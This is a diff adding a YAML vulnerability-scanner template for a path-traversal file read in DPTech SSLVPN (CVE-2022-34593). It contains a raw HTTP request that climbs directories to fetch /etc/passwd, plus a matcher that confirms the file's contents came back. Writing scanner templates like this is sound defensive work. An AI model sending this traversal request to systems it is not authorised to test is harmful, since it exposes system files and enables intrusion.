@@ -1,0 +1,29 @@
+id: dptech-vpn-file-read
+info:
+  name: DPTech VPN File Read Vulnerability (CVE-2022-34593)
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    There is a file reading vulnerability in DPTech SSLVPN systems. Attackers can exploit this vulnerability to obtain sensitive system information.
+  tags: file-read
+  reference:
+    - https://www.dptech.com/
+  classification:
+    cvss-metrics: "3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
+    cvss-score: 7.5
+    cve-id: CVE-2022-34593
+
+http:
+  - raw:
+      - |
+        GET /../../../../../../../etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "root:x:.*:0:0:"
